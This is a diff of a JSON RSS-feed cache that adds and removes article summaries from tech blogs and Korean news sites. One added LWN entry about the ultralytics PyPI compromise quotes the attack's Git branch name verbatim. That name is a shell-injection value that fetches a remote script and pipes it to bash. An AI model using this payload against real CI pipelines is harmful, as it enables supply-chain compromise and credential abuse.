@@ -525,26 +525,6 @@
           "wordCount": null,
           "title": "Build & deploy JBoss EAP 8 images in OpenShift with Galleon & Helm charts",
           "imageUrl": null
-        },
-        {
-          "id": "a9b95a09-f63d-48b9-b29e-802929b39f07",
-          "author": "Alexandra Petlanova Hajkova",
-          "description": "This article describes the new file descriptor related features recently added to Valgrind and explains how to use them to track the file descriptors that your program is using or, more importantly, misusing. \nValgrind was able to track file descriptors for a while. But my colleague Mark Wielaard and I improved this feature and turned all file descriptor operations into events, which allowed Valgrind to create errors on misuse that can show where the operation occurred, made them suppressible, and can be reported in different formats.\nWhat is Valgrind?\nValgrind is an instrumentation framework for building dynamic analysis tools. The tool can detect various memory management and threading bugs. To be able to detect the bugs, Valgrind decompiles, instruments, and recompiles your code to inte…",
-          "link": "https://developers.redhat.com/articles/2024/11/07/track-file-descriptors-valgrind",
-          "publishedOn": "2024-11-07T07:00:00.000Z",
-          "wordCount": null,
-          "title": "How to track file descriptors with Valgrind",
-          "imageUrl": null
-        },
-        {
-          "id": "76a016dd-e6ef-4d49-a207-92e35bd265e0",
-          "author": "Chris Kyrouac",
-          "description": "Logically bound images are a recently added feature in bootc that allows any container image to be managed directly by bootc. One of the many benefits this provides is simplified system management. An application image can be \"bound\" to a bootc operating system image as part of the bootc container build.\nThis simplified system management would have been useful for a project I previously worked on. The project was a large web application composed of dozens of microservices running in a Kubernetes cluster. These microservices primarily used Kafka to communicate. Our Kafka instance was also deployed in a Kubernetes cluster using the amq-streams operator.\nThe operator made the deployment and management of the Kafka cluster simple; however, keeping the cluster stable was a constant battle. One …",
-          "link": "https://developers.redhat.com/articles/2024/11/07/use-bootc-logically-bound-images-deploy-kafka-cluster",
-          "publishedOn": "2024-11-07T07:00:00.000Z",
-          "wordCount": null,
-          "title": "Use bootc logically bound images to deploy a Kafka cluster",
-          "imageUrl": null
         }
       ]
     },
@@ -614,6 +594,26 @@
       "feedUrl": "https://www.embedded.com/feed/",
       "siteUrl": "https://www.embedded.com/",
       "articles": [
+        {
+          "id": "https://www.embedded.com/?p=4492831",
+          "author": "Stefano Lovati",
+          "description": "Here’s a RoundUp of this week’s must-read articles – we’ll delve into the latest developments on Portable Memory, BMS Open Wire Detection, and Embedded Rust! Also, check News Archives – Embedded and Technical Articles Archives – Embedded for the complete list of news and articles from our website. NEWS X-FAB Introduces Embedded Flash Solution Utilizing Its 110nm Automotive BCD-on-SOI […]\nThe post Portable Memory, BMS Open Wire Detection, Embedded Rust: Embedded Week Insights appeared first on Embedded.",
+          "link": "https://www.embedded.com/portable-memory-bms-open-wire-detection-embedded-rust-embedded-week-insights/",
+          "publishedOn": "2024-12-06T16:00:00.000Z",
+          "wordCount": null,
+          "title": "Portable Memory, BMS Open Wire Detection, Embedded Rust: Embedded Week Insights",
+          "imageUrl": null
+        },
+        {
+          "id": "https://www.embedded.com/?p=4492343",
+          "author": "Stefano Lovati",
+          "description": "Passive components don’t need an external power source and don’t increase or generate power; they use a small amount of energy. In contrast, active components require a power source, like a battery, to increase the power of signals. Examples of passive components include resistors, capacitors, and inductors while transistors and integrated circuits (ICs) are active […]\nThe post Passive Component Selection Know-How for Hardware Design appeared first on Embedded.",
+          "link": "https://www.embedded.com/passive-component-selection-know-how-for-hardware-design/",
+          "publishedOn": "2024-12-06T11:06:29.000Z",
+          "wordCount": null,
+          "title": "Passive Component Selection Know-How for Hardware Design",
+          "imageUrl": null
+        },
         {
           "id": "https://www.embedded.com/?p=4492382",
           "author": "Loriotoole",
@@ -1311,6 +1311,16 @@
       "siteUrl": "https://developers.googleblog.com/rss/",
       "articles": [
         {
+          "id": "https://developers.googleblog.com/en/looking-back-at-the-first-year-of-the-gemini-era/",
+          "author": null,
+          "description": "The range of family of Gemini models has expanded in the past year in response to developer needs, introducing faster and more cost-effective models, and enhancing tools in Google AI Studio.",
+          "link": "https://developers.googleblog.com/en/looking-back-at-the-first-year-of-the-gemini-era/",
+          "publishedOn": "2024-12-06T20:17:59.644Z",
+          "wordCount": null,
+          "title": "Looking back at the first year of the Gemini era",
+          "imageUrl": null
+        },
+        {
           "id": "https://developers.googleblog.com/en/introducing-paligemma-2-powerful-vision-language-models-simple-fine-tuning/",
           "author": null,
           "description": "PaliGemma 2, the next evolution in tunable vision-language models, comes with new features such as scalable performance, long captioning, and expanded capabilities. Get started with pre-trained models, documentation, and tutorials.",
@@ -1549,16 +1559,6 @@
           "wordCount": null,
           "title": "Supercharging AI Coding Assistants with Gemini Models' Long Context",
           "imageUrl": null
-        },
-        {
-          "id": "https://developers.googleblog.com/en/gemma-explained-paligemma-architecture/",
-          "author": null,
-          "description": "PaliGemma, a lightweight open vision-language model (VLM), is able to take both image and text inputs and produce a text response, adding an additional vision model to the BaseGemma model.",
-          "link": "https://developers.googleblog.com/en/gemma-explained-paligemma-architecture/",
-          "publishedOn": "2024-11-06T20:16:35.329Z",
-          "wordCount": null,
-          "title": "Gemma explained: PaliGemma architecture",
-          "imageUrl": null
         }
       ]
     },
@@ -1765,16 +1765,6 @@
           "wordCount": null,
           "title": "Redesigning our conference swag: here we go again",
           "imageUrl": null
-        },
-        {
-          "id": "https://pvs-studio.com/en/blog/posts/csharp/1180/",
-          "author": null,
-          "description": "Welcome to the fourth part of our digest on news and events in the .NET world! We've got a lot of updates this time. The PVS-Studio team is happy to present you a selection of the most exciting and...",
-          "link": "https://pvs-studio.com/en/blog/posts/csharp/1180/",
-          "publishedOn": "2024-11-06T21:00:00.000Z",
-          "wordCount": null,
-          "title": ".NET Digest #4",
-          "imageUrl": null
         }
       ]
     },
@@ -1831,16 +1821,6 @@
           "wordCount": 1538,
           "title": "Sequential-storage － Efficiently Store Data in Flash",
           "imageUrl": "https://interrupt.memfault.com/img/sequential-storage-crate/sequential-storage-main-image.jpg"
-        },
-        {
-          "id": "https://interrupt.memfault.com/blog/october-2024-roundup",
-          "author": null,
-          "description": "Here are the articles, videos, and tools that we’ve been excited about this\nOctober.\nContinue reading…",
-          "link": "https://interrupt.memfault.com/blog/october-2024-roundup",
-          "publishedOn": "2024-11-07T00:00:00.000Z",
-          "wordCount": null,
-          "title": "What we've been reading in October (2024)",
-          "imageUrl": null
         }
       ]
     },
@@ -1879,6 +1859,56 @@
       "feedUrl": "https://lwn.net/headlines/rss",
       "siteUrl": "https://lwn.net",
       "articles": [
+        {
+          "id": "https://lwn.net/Articles/1001215/",
+          "author": "daroc",
+          "description": "A compromised release was uploaded to PyPI after a project automatically processed a pull request with a flawed script.\nThe GitHub account \n\n\"OpenIM Robot\"\n(which appears to be controlled by\nXinwei Xiong) opened\na pull request for the \n\nultralytics\nPython package. The pull request included a suspicious Git branch name:\n\n\n\nopenimbot:$({curl,-sSfL,raw.githubusercontent.com/ultralytics/ultralytics/12e4f54ca3f2e69bcdc900d1c6e16642ca8ae545/file.sh}${IFS}|${IFS}bash)\n\n\n\nUnfortunately, ultralytics uses the\npull_request_target GitHub Action trigger to automate some of its continuous integration tasks. This runs a script from the base branch of the repository, which has access to the repository's secrets — but that script was vulnerable to a shell injection attack from the branch name of the pull request. The injected script appears to have used the credentials it had access to in order to compromise a later release uploaded to PyPI to include a cryptocurrency miner. It is hard to be sure of the details, because GitHub has already pulled the malicious script.\n\n\n\nThis problem has been\nknown for several years, but this event may serve as a good reminder to be careful with automated access to important secrets.",
+          "link": "https://lwn.net/Articles/1001215/",
+          "publishedOn": "2024-12-06T18:44:12.000Z",
+          "wordCount": null,
+          "title": "Abusing Git branch names to compromise a PyPI package",
+          "imageUrl": null
+        },
+        {
+          "id": "https://lwn.net/Articles/1001202/",
+          "author": "daroc",
+          "description": "Greg Kroah-Hartman released version\n6.12.3 of the kernel to fix\n\na regression that can cause some machines to fail to boot on version 6.12.2.\nThe other stable branches are continuing on their normal cadence, with\n\n6.12.4-rc1 and\n\n6.6.64-rc1 starting review today.",
+          "link": "https://lwn.net/Articles/1001202/",
+          "publishedOn": "2024-12-06T15:58:41.000Z",
+          "wordCount": null,
+          "title": "A single stable kernel to fix boot problems",
+          "imageUrl": null
+        },
+        {
+          "id": "https://lwn.net/Articles/1000654/",
+          "author": "corbet",
+          "description": "The page\nstructure sits at the core of the kernel's memory-management subsystem\n(for now), and a key part of that structure is its reference count, stored\nin refcount.  The page reference count tells the kernel how many\nusers a given page has and when it can be freed.  That count is not needed\nfor every page in the system, though.  Matthew Wilcox has recently resurrected\nan old\npatch set that expands the concept of a \"frozen\" page — one that lacks a\nmeaningful reference count — to the immediate benefit of the slab allocator\nbut in the service of a longer-term goal as well.",
+          "link": "https://lwn.net/Articles/1000654/",
+          "publishedOn": "2024-12-06T15:55:16.000Z",
+          "wordCount": null,
+          "title": "[$] Freezing out the page reference count",
+          "imageUrl": null
+        },
+        {
+          "id": "https://lwn.net/Articles/1001164/",
+          "author": "daroc",
+          "description": "Security updates have been issued by AlmaLinux (firefox, postgresql, postgresql:12, postgresql:13, postgresql:15, postgresql:16, python3:3.6.8, and thunderbird), Debian (clamav), Fedora (pam), Red Hat (firefox, postgresql:13, postgresql:15, python-tornado, redis:7, ruby, ruby:2.5, and ruby:3.1), SUSE (avahi, docker-stable, java-1_8_0-openjdk, libmozjs-128-0, obs-scm-bridge, php8, and teleport), and Ubuntu (ghostscript, needrestart, and shiro).",
+          "link": "https://lwn.net/Articles/1001164/",
+          "publishedOn": "2024-12-06T14:26:41.000Z",
+          "wordCount": null,
+          "title": "Security updates for Friday",
+          "imageUrl": null
+        },
+        {
+          "id": "https://lwn.net/Articles/1001013/",
+          "author": "corbet",
+          "description": "Apertis is a Collabora-developed\nDebian derivative distribution designed to be incorporated into electronic\ndevices; the v2024\nrelease is now available.  It is now based on the Bookworm release, and\nincludes support for Podman, ONNX\nRuntime, OP-TEE, and more.\n\n\n\tApertis relies on the Debian Free Software Guidelines to ensure all\n\tsoftware shipped is open source or, in limited cases, at least\n\tfreely distributable. However, for some customers this is not\n\tenough to be able to adopt OSS solutions as in their evaluations\n\tsome provisions in common licenses like the GPL-3 are at odds with\n\tregulatory constraints they are subject to. Apertis does not set to\n\tsolve this decades-long debate, and instead its goal is to increase\n\tthe adoption of modern, maintained OSS solutions in markets where\n\tthis has historically been a challenge. To enable this, Apertis\n\tsupports avoiding the use of any software under some licenses (like\n\tthe [GPL v3.0 license family) on target images, while still making\n\tthem fully available for development and for customers that do not\n\tshare those licensing concerns. To avoid these licenses, Apertis\n\tuses more modern alternatives instead of relying on outdated and\n\tunmaintained pre-GPL-3 versions. For instance, coreutils and\n\tfindutils (GPL-3+) are replaced in Apertis by rust-coreutils and\n\trust-findutils.",
+          "link": "https://lwn.net/Articles/1001013/",
+          "publishedOn": "2024-12-05T23:38:50.000Z",
+          "wordCount": null,
+          "title": "Apertis v2024 released",
+          "imageUrl": null
+        },
         {
           "id": "https://lwn.net/Articles/1000941/",
           "author": "jzb",
@@ -2668,46 +2698,6 @@
           "wordCount": null,
           "title": "Security updates for Thursday",
           "imageUrl": null
-        },
-        {
-          "id": "https://lwn.net/Articles/996377/",
-          "author": "corbet",
-          "description": "The LWN.net Weekly Edition for November 7, 2024 is available.",
-          "link": "https://lwn.net/Articles/996377/",
-          "publishedOn": "2024-11-07T02:57:15.000Z",
-          "wordCount": null,
-          "title": "[$] LWN.net Weekly Edition for November 7, 2024",
-          "imageUrl": null
-        },
-        {
-          "id": "https://lwn.net/Articles/996329/",
-          "author": "daroc",
-          "description": "Image-based Linux distributions have seen increasing popularity, recently. They\npromise reliability and security, but pose packaging problems for\nexisting distributions. Ryan Lahfa and Niklas Sturm spoke about the work that\nNixOS has done to enable an image-based workflow at this year's\n\nAll Systems Go!\nconference in Berlin.\nUnfortunately, LWN was not able to cover the conference for scheduling reasons,\nbut the\n\nvideos of the event are available for anyone interested in watching the\ntalks.\nLahfa and Sturm explained that it is currently possible to create a\n\nNixOS system that\ncryptographically verifies the kernel, initrd, and Nix store on boot — although\ndoing so still has some rough edges. Making an image-based NixOS installation is\nsimilarly possible.",
-          "link": "https://lwn.net/Articles/996329/",
-          "publishedOn": "2024-11-06T16:35:20.000Z",
-          "wordCount": null,
-          "title": "[$] Building secure images with NixOS",
-          "imageUrl": null
-        },
-        {
-          "id": "https://lwn.net/Articles/997193/",
-          "author": "corbet",
-          "description": "Man pages maintainer Alejandro Colomar announced in September that he was suspending\nhis work due to a lack of support.  He has now let\nit be known that funding has been found for the next year at least:\n\n\n\tWe've been talking for a couple of months, and we have already\n\tagreed to sign a contract through the LF [Linux Foundation], where\n\ta number of companies provide the funds for the contract.  The\n\tcontract will cover the next 12 months for the agreed amount, and\n\twe should sign it in the following days.  Since I've already seen a\n\tdraft of the contract, and it looks good, I've already started\n\tmaintaining the project again, starting on Nov 1st.",
-          "link": "https://lwn.net/Articles/997193/",
-          "publishedOn": "2024-11-06T15:48:15.000Z",
-          "wordCount": null,
-          "title": "Funding restored for man-page maintenance",
-          "imageUrl": null
-        },
-        {
-          "id": "https://lwn.net/Articles/997182/",
-          "author": "jzb",
-          "description": "Security updates have been issued by AlmaLinux (libtiff), Debian (context, libheif, and thunderbird), Fedora (php-tcpdf, syncthing, and thunderbird), Gentoo (EditorConfig core C library, Flatpak, Neat VNC, and Ubiquiti UniFi), Oracle (bcc, bpftrace, grafana-pcp, haproxy, kernel, krb5, libtiff, python-gevent, python3.11-urllib3, python3.12-urllib3, and xmlrpc-c), Red Hat (python3.11-urllib3), SUSE (audacity, curl, govulncheck-vulndb, gradle, htmldoc, libgsf, python310, and qbittorrent), and Ubuntu (linux-aws-5.4, linux-oracle-5.4, mpg123, and python-werkzeug).",
-          "link": "https://lwn.net/Articles/997182/",
-          "publishedOn": "2024-11-06T14:13:03.000Z",
-          "wordCount": null,
-          "title": "Security updates for Wednesday",
-          "imageUrl": null
         }
       ]
     },
@@ -2959,6 +2949,16 @@
       "siteUrl": "http://economicview.net",
       "articles": [
         {
+          "id": "http://economicview.net/?p=85634",
+          "author": "sticky",
+          "description": "By Wei-Te Wong – https://www.flickr.com/photos/wongwt/27202724082/, CC BY-SA 2.0, Link 탄핵에 관한 남한의 경험은 매우 드문 장면이다. 내가 공동으로 저술한 최신 연구에 따르면 1990년과 2017년 사이에 전 세계적으로 탄핵이 성공한 것은 단지 열 번에 불과했다. 그러나 남한은 다른 이들이 따를만한 가치 있는 선례를 남겼다. 어떤 이는 민주적으로 선출한 지도자를 제거하는 것은 비민주적이라고 주장하기도 하지만 탄핵은 민주주의를 […]",
+          "link": "http://economicview.net/85634/",
+          "publishedOn": "2024-12-06T01:52:12.000Z",
+          "wordCount": null,
+          "title": "탄핵선진국 대한민국",
+          "imageUrl": null
+        },
+        {
           "id": "http://economicview.net/?p=85601",
           "author": "sticky",
           "description": "미국에 사는 35,000명의 성인을 대상으로 한 2011년 연구에 따르면 연 7만 달러 초과의 소득 집단보다 연 4만 달러 미만의 소득 집단에서 정신적 문제가 많은 이들이 더 흔했다고 한다. [중략] 이러한 상관성은 또한 저소득과 중소득의 국가들에게서 더 강하게 나타났다. [중략] 저소득으로 살아가는 이들은 일반적으로 고소득의 가계에서의 이들보다 더 나중에야 정신과 서비스를 이용한다. 이는 그러한 서비스에 대한 […]",
@@ -2975,6 +2975,36 @@
       "feedUrl": "https://feeds.feedburner.com/slownews",
       "siteUrl": "https://slownews.kr",
       "articles": [
+        {
+          "id": "https://slownews.kr/?p=122980",
+          "author": "최병천",
+          "description": "[최병천 칼럼] 명령 불복종한 군인들, 총 들고 설친다고 움츠려들 국민들이 아니다. 사태의 전말이 속속 드러나고 있다. 이번 사태에서 최대 미스터리는 윤석열이 도대체 왜 무엇을 얻고자 비상계엄을 선포했는지다. 헌법 제77조에 의하면, 국회 과반이 의결하면 계엄이 해제된다. 윤석열도 그걸 모르진 않았을텐데 강행했다. 목표가 무엇이었는지, 왜 계엄이라는 ‘수단’을 사용했는지, 도무지 풀리지 않는 의문이었다. 이처럼 어마어마한 사태를 일으켰으면, 분명...\nThe post 윤석열은 ‘계엄’이 뭔지도 몰랐다. appeared first on 슬로우뉴스..",
+          "link": "https://slownews.kr/122980",
+          "publishedOn": "2024-12-06T06:15:04.000Z",
+          "wordCount": null,
+          "title": "윤석열은 ‘계엄’이 뭔지도 몰랐다.",
+          "imageUrl": null
+        },
+        {
+          "id": "https://slownews.kr/?p=122972",
+          "author": "이정환",
+          "description": "[슬로우데이터] 이재명 지지율 역대 최고 수준, 한동훈은 급락. 윤석열(대통령) 지지율이 16%까지 추락했다. 부정 평가는 75%를 찍었다. 갤럽 정기 여론조사 결과다. 12월 3~5일까지 조사 결과라 일부는 비상계엄 여론이 반영되지 않았을 수 있다. (비상계엄 선포는 3일 저녁이었다.) 이게 왜 중요한가. 대구 경북도 12%뿐. 계엄 이후 지지율은 13%. 민주당 지지율은 급등. 이재명 지지율 압도적인 1위.\nThe post ‘친위 쿠데타’ 실패, 윤석열 지지율 13%까지 떨어졌다. appeared first on 슬로우뉴스..",
+          "link": "https://slownews.kr/122972",
+          "publishedOn": "2024-12-06T03:48:19.000Z",
+          "wordCount": null,
+          "title": "‘친위 쿠데타’ 실패, 윤석열 지지율 13%까지 떨어졌다.",
+          "imageUrl": null
+        },
+        {
+          "id": "https://slownews.kr/?p=122952",
+          "author": "이정환",
+          "description": "지금까지 확인된 사실. 윤석열 탄핵안 표결 D-1. 시간 문제일 뿐. 여론조사는 74%가 탄핵 찬성. 쟁점과 현안. “형편없는 오판(badly misjudged).” ‘아메리칸 파이’는 끝났다. “한국의 민주주의의 승리를 기대한다.” 계엄사령관 사표는 반려. 군 부대 국회 투입 누가 지시했나. “국민들께 너무 죄송했다.” 김용현이 지휘했다. 포고령은 누가 작성했나. 윤석열이 계엄사령부를 방문했다. 이상민이 실토한 진실. “경고성 계엄이었다.” 더 깊게 읽기. 계엄군이...\nThe post 윤석열 탄핵안 표결 D-1, 민주주의의 힘을 보여줄 때다: 슬로우레터 12월6일. appeared first on 슬로우뉴스..",
+          "link": "https://slownews.kr/122952",
+          "publishedOn": "2024-12-05T22:37:00.000Z",
+          "wordCount": null,
+          "title": "윤석열 탄핵안 표결 D-1, 민주주의의 힘을 보여줄 때다: 슬로우레터 12월6일.",
+          "imageUrl": null
+        },
         {
           "id": "https://slownews.kr/?p=122902",
           "author": "신현호",
@@ -3524,46 +3554,6 @@
           "wordCount": null,
           "title": "윤석열의 자백? 채 상병 사건 문제의 통화, 김건희가 걸었을 수도 있다: 슬로우레터 11월8일.",
           "imageUrl": null
-        },
-        {
-          "id": "https://slownews.kr/?p=120732",
-          "author": "이정환",
-          "description": "임기 전반을 며칠 남겨둔 시점에서 오늘 대국민 담화는 윤석열 정부의 남은 2년 반을 결정할 중요한 이벤트였다. 언론의 요구는 크게 세 가지였다. 최악의 선택. 거짓말을 덮는 거짓말. 윤석열이 자백한 국정농단 정황. 부산일보 기자의 질문. 무엇을 사과한다는 건가. 다음은 오늘 기자회견의 주요 발언을 정리한 것이다. 모두 발언. 나와 정부의 부족했던 부분을 잘 알고 있다. 고쳐야 할 부분들을...\nThe post “순진한 아내를 악마화”, 마지막 반전 기회를 걷어찼다. appeared first on 슬로우뉴스..",
-          "link": "https://slownews.kr/120732",
-          "publishedOn": "2024-11-07T07:33:28.000Z",
-          "wordCount": null,
-          "title": "“순진한 아내를 악마화”, 마지막 반전 기회를 걷어찼다.",
-          "imageUrl": null
-        },
-        {
-          "id": "https://slownews.kr/?p=113278",
-          "author": "소셜코리아",
-          "description": "지난 2년 동안 오픈AI가 불러일으킨 생성형 인공지능 열풍이 드디어 기후 대응 영역에서도 파란을 일으키기 시작했다. 사회경제적으로 온갖 낙관과 기대를 불러일으켜 온 인공지능 붐이 온실가스 감축과 기후 재난 대비에도 획기적으로 기여할 수 있다는 전망이 쏟아지는 것이다. 온실가스 감축 vs. 전기 먹는 하마 인공지능 단백질 구조 예측 모델 ‘알파폴드’를 개발해 노벨 화학상을 받은 데미스 허사비스(Demis Hassabis)는 이미...\nThe post AI와 기후위기: 온실가스 감축 vs. 전기 먹는 하마 appeared first on 슬로우뉴스..",
-          "link": "https://slownews.kr/113278",
-          "publishedOn": "2024-11-07T06:01:40.000Z",
-          "wordCount": null,
-          "title": "AI와 기후위기: 온실가스 감축 vs. 전기 먹는 하마",
-          "imageUrl": null
-        },
-        {
-          "id": "https://slownews.kr/?p=120667",
-          "author": "이정환",
-          "description": "더 늙고 더 위험한 트럼프가 돌아왔다. 트럼프의 부활. 트럼프가 어떻게 이겼나. 출구 조사를 살펴보니. 여론조사는 왜 틀렸나. “독재자를 고용했다.” 네이트 실버가 말하는 트럼프가 이긴 이유 24가지. 해리스는 왜 졌을까. 쟁점과 현안. 트럼프 충격, 원-달러 환율 1400원 돌파. 음주운전 논란, ‘7상시’ 행정관 복귀. 더 깊게 읽기. “집에 물어보고.” 마지막 기회. “유배나 귀양이라도 보내야 한다.” 다르게 읽기....\nThe post 더 늙고 더 위험한 트럼프가 돌아왔다: 슬로우레터 11월7일. appeared first on 슬로우뉴스..",
-          "link": "https://slownews.kr/120667",
-          "publishedOn": "2024-11-06T22:18:53.000Z",
-          "wordCount": null,
-          "title": "더 늙고 더 위험한 트럼프가 돌아왔다: 슬로우레터 11월7일.",
-          "imageUrl": null
-        },
-        {
-          "id": "https://slownews.kr/?p=120640",
-          "author": "이승주",
-          "description": "보호 글이라서 요약이 없습니다.\nThe post 보호된 글: 매운 맛 트럼프, 온 세상이 맛의 지옥을 경험할 차례다. appeared first on 슬로우뉴스..",
-          "link": "https://slownews.kr/120640",
-          "publishedOn": "2024-11-06T14:10:24.000Z",
-          "wordCount": null,
-          "title": "보호된 글: 매운 맛 트럼프, 온 세상이 맛의 지옥을 경험할 차례다.",
-          "imageUrl": null
         }
       ]
     },
@@ -3572,6 +3562,16 @@
       "feedUrl": "https://happist.com/feed",
       "siteUrl": "https://happist.com",
       "articles": [
+        {
+          "id": "https://happist.com/?p=596833",
+          "author": "happist",
+          "description": "미국 기준으로 2024년 쇼핑시즌이 막을 내리고 잇습니다. 아직 크리스마스 시즌이 남아 있기느 하지만 사이버먼데를 기점으로 중요한 쇼핑 시즌은 막을 내린것으로 보는게 맞을 것 같습니다. 이번 2024년 쇼핑시즌 트렌드 시사점에늠 무엇이 있을까요? 도널드 트럼프 대통령 당선인이 제안한 관세로 인해 물가가 급등하기 전에 미리 구매하려는 소비자들은 큰 폭의 할인 혜택을 누리고 고가 품목을 사재기했습니다. Adobe 애널리틱스에 따르면 […]",
+          "link": "https://happist.com/596833/2024%eb%85%84-%ec%87%bc%ed%95%91%ec%8b%9c%ec%a6%8c-%ed%8a%b8%eb%a0%8c%eb%93%9c-%ec%8b%9c%ec%82%ac%ec%a0%90-%ec%82%ac%ec%9d%b4%eb%b2%84%eb%a8%bc%eb%8d%b0%ec%9d%b4-%eb%a7%a4%ec%b6%9c-%ec%b5%9c%ea%b3%a0",
+          "publishedOn": "2024-12-06T01:48:24.000Z",
+          "wordCount": null,
+          "title": "2024년 쇼핑시즌 트렌드 시사점, 사이버먼데이 매출 최고치 기록",
+          "imageUrl": null
+        },
         {
           "id": "https://happist.com/?p=596830",
           "author": "happist",
